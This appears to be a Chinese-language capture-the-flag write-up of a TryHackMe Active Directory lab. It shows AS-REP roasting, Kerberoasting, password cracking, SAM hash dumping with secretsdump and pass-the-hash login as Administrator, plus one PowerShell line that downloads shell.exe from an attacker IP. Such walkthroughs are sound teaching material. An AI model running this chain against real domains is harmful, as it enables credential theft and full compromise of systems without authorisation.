# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# nmap -sV -Pn 10.10.33.36 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 01:20 EST
Stats: 0:07:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:15 remaining)
Stats: 0:07:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.00% done; ETC: 01:29 (0:00:18 remaining)
Nmap scan report for 10.10.33.36
Host is up (0.31s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-18 06:28:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49790/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 497.82 seconds

```

enum4linux枚举没有发现

目录爆破http服务没有发现

## 用smbmap枚举用anonymous能登陆什么分享目录

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbmap -H 10.10.33.36 -u anonymous                                                                                                                                                                                                  1 ⨯
[+] Guest session       IP: 10.10.33.36:445     Name: 10.10.33.36                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet IPC$ Sharing
```
看到有3个分享文件夹我们有读权限

VulnNet-Business-Anonymous
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbclient  //10.10.33.36/VulnNet-Business-Anonymous                                                                                                                                                                                 1 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4527319 blocks available

```

VulnNet-Enterprise-Anonymous 
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbclient  //10.10.33.36/VulnNet-Enterprise-Anonymous                                                                                                                                                                             130 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
```
文件下载到本地分析，可惜没有什么有用的东西

## 用```Impacket```枚举用户名

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.33.36
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.33.36
[*] StringBinding ncacn_np:10.10.33.36[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

```

整理以后得到一个用户名名单：
```
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

我们保存到user.txt

因为88端口运行了Kerberos，所以我们可以利用它来获得可能泄露的哈希。
## 枚举名单里面的哈希值：

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip 10.10.33.36 
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:f20c16f548ddfd2ac7319c9704bae283$9738ca133868bf27e925782307eb25fc9bc68bfff5017e16e1a25c2e1b96b5c3a4e2f1063c7216841912adca343d8177b2e6a2470226378efd813f3846a29d78f97586195cac44cfeee5b2e8cb872f10bd13500e5b73483e2b6cd98d5a5e88f7ec6110fb42584e9241495a30662609363fab4658e4ca6e5a6eb5d67350ad10025084acf32abe6bd583d9093256cf5952814a47d78abfecce868be591aa65c8424c46477099f7952d7c1dbf13d32c397cad6483e3017d7c8a990b63e7c76b4473230295d221f98266420e742172f18c2c0e7ee81e2f545c7c13b3428a457a03edcde7f705a41ea5a96d95f8f06bee1ea9
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```

把上面枚举出来的哈希值保存到文件hash.txt

## 用```name-that-hash```识别哈希类型

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# name-that-hash -f hash.txt

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$krb5asrep$23$t-skid@VULNNET-RST:f20c16f548ddfd2ac7319c9704bae283$9738ca133868bf27e925782307eb25fc9bc68bfff5017e16e1a25c2e1b96b5c3a4e2f1063c7216841912adca343d8177b2e6a2470226378efd813f3846a29d78f97586195cac44cfeee5b2e8cb872f10bd13500e5b
73483e2b6cd98d5a5e88f7ec6110fb42584e9241495a30662609363fab4658e4ca6e5a6eb5d67350ad10025084acf32abe6bd583d9093256cf5952814a47d78abfecce868be591aa65c8424c46477099f7952d7c1dbf13d32c397cad6483e3017d7c8a990b63e7c76b4473230295d221f98266420e74
2172f18c2c0e7ee81e2f545c7c13b3428a457a03edcde7f705a41ea5a96d95f8f06bee1ea9

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory
```


john破解这个哈希：
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)
1g 0:00:00:04 DONE (2021-11-18 05:12) 0.2169g/s 689478p/s 689478c/s 689478C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

得到密码：```tj072889*```


## 用上面的密码导出keberoast的哈希到```keberoast.hash```:
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.33.36

Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             


```

拿到一个哈希，用户名是```enterprise-core-vn```：
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# cat keberoast.hash     
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$2618a765871c5a8446adf613ba819777$71774f1140aff695e248ad3d8d18bae7c637a6fb7d90ea404467ba948553df978fd36b8241cd75acdbb7c5b07892c30f32233c8f4645b0788d52d4547903a14aef7aeef814bcd3580ba933bad580c80b416c5fabdea8da999d5b897effcc89c9976aba0407836dd9eba10d197086e062c0cc3dd6512599b8b09a0b8d4163b31a45179f0b63b49befd83f3d69ba8349bfd338e997fb7cda1cf9cc71f3b2459e58cdc1ca6cc66c236c514aaef9dd682985362394025631e431ec4207c8d3ff9dfc155cbac519476212ab4fea2fb575f9a234ea477192f7e3be60e8987d701bd212236353211d4406b4ef7fa8de292ca5b105f182329d0ea27ed73883bdde30bff7686084471cfdf2dcface8855c9ac472a4e153f474f7434a5a8ccb377db5fe4dae79aa4d51d45662198b92a61c931c3fad4597c0fa93df3fa2aa0df5e539dae0f329ba468bb8a2588562ff0ceaedcfd54c8ef65b626ab48daf640084f7e244a4c30e587961b8b2e5288d5f32d766169716333c6725860365217b11aaa18c6590b224903611060c0f456cfa8578f338a3450615cc998a4897e127438a5b45f29b0884b92988a4c347241e6e5ac4bb78c21570a7ff016a5cc127ab29b17ec0014a0d8cbfd85d4be67ae12858a7effa26d41915fb71ba53944846578efbc9b449a8194e66491be701e929982fab72a26333d098d808799d0ee688edc9bdbfd820c0a401fc731a98494c7c71dc6154e2b1e0545a0abb6ada5c1a1931b8cf81a70e0dec22f2bb611435c6165ad13df9fdb40120852924db1aa4a7eb62bc3da53adf862592541a59d7c6e4d936f82dbeeadea58795d33fdf389a3ac78f8c5bab7c4a748fb465b0eeceb1ad44ced20330066babbab403c241c576642d2740ccb1ae14289752f245b25cf79571194fdf681abfa7c37b8e5f527bdc7d112752d87c0ac36f8288a2f5a11ea04da55e8ee0edc5fde6495e4c253a8fa5e0e9122aa009ace42de1efb34504a6e09e0f09824603867a2c7eef16857a184cceeeedcb2740165776caafb05e088bd75a0efd62211c5e9b766146549ef5972a5583958923c46340cc22feb6ec49068c962ff21955aaa1ab378303f085a905a6b38b87a2eddb05815d34f094b596ad65cd2fb631a5f9adb6e6e0c787bbe1429dc0d7b6b175506e84ff9c00b1296dda6549f352060fffe81d6025a8d42a8ebf07f8d94789efd1106afcf85ff365283cf58cde1683ba4c1df1c9cad0fba2fd0e6ce58658e334a1c0839c3af7f98db19ee88875b028d778c74f79a2f799727c8f2231e82b9919ecfb9567352426a92af85cb903a3b8f9f03aad9f10a753404beffe200172c5fb7dee1fb6a7ed9e062d98ed83517dfe707da9a72fb93aff4f56f3300891cb6c8d60b

```

## 再次识别哈希类型：
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─#  name-that-hash -f keberoast.hash                                                                                                                                                                                                 130 ⨯

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    
Most Likely 
Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Active Directory.

```

## 再次用john破解这个哈希
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt keberoast.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)
1g 0:00:00:03 DONE (2021-11-18 05:24) 0.2531g/s 1040Kp/s 1040Kc/s 1040KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
得到密码：```ry=ibfkfv,s6h,```

# 用evil-winrm登录，拿到初始shell：

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.33.36

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
vulnnet-rst\enterprise-core-vn

```

拿到user.txt：
```
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> pwd

Path
----
C:\Users\enterprise-core-vn\Desktop


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> ls


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> get-content user.txt

```
# 提权
传winpen：
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/shell.exe','C:\Users\enterprise-core-vn\Desktop\shell.exe')"
```

开始枚举提权漏洞：
```
*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> Start-Process C:\Users\enterprise-core-vn\desktop\winPEASx64.exe
This command cannot be run due to the error: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
At line:1 char:1

```

可能存在某种防病毒软件，我们的winpea不能正常执行。

我们现在已经有了```enterprise-core-vn```的登录凭证，可以用来再次枚举共享文件夹的登入权限

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbmap -H 10.10.33.36 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'                                                                                                                                                                 2 ⨯
[+] IP: 10.10.33.36:445       Name: 10.10.33.36                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```

可以看到，我们现在对```NETLOGON```和```SYSVOL```也有了读权限
我们登陆```SYSVOL```

```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbclient //10.10.33.36/SYSVOL -U enterprise-core-vn%ry=ibfkfv,s6h,                                                                                                                                                             130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021
cd 
                8771839 blocks of size 4096. 4532836 blocks available
smb: \> cd vulnnet-rst.local
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8771839 blocks of size 4096. 4532836 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8771839 blocks of size 4096. 4532836 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs 
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)

```

## 下载```scripts```文件夹下的```ResetPassword.vbs```文件


打开这个文件，又找到了另一个登录凭证：
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# cat ResetPassword.vbs                                 
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

```

## 用得到的凭证，我们再次列出samba可以登录的共享文件夹:


```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# smbmap -H 10.10.33.36 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'                                                                                                                                                                       130 ⨯
[+] IP: 10.10.33.36:445       Name: 10.10.33.36                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              NO ACCESS       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            NO ACCESS       VulnNet Enterprise Sharing

```


这次我们甚至对admin有了读写权限。

## 我们用脚本导出所有哈希（hashdump）：
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.33.36
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
## 拿到system.txt
上面得到的哈希无需破解，直接登录```Administrator```账号
```
┌──(root💀kali)-[~/tryhackme/Roasted]
└─# evil-winrm -i 10.10.33.36 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d                                                                                                                                                      1 ⨯

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> get-content system.txt
```

# 总结
1. 我们从anonymous账号是否能登陆共享文件夹作为攻击的立足点。
2. 然后用```/opt/impacket/examples/lookupsid.py```脚本枚举了在windows上的用户名
3. 根据用户名单，针对```Kerberos```服务，我们利用```/opt/impacket/examples/GetNPUsers.py```脚本又导出了可能的用户哈希，这个是比较重要的一点，我们利用```evil-winrm```得到了一个初始shell，但是因为系统本身可能存在某种反病毒软件，我们不能执行winpea。
4. 继续用新得到的用户凭证，利用```smbmap```得到了更多共享文件夹的登入权限。
5. 在某个配置文件里（文件配置泄露漏洞），我们又得到了一个更高权限的用户凭证。
6. 依靠高权限用户，直接导出了Administrator的哈希，至此我们得到了系统的最高权限。

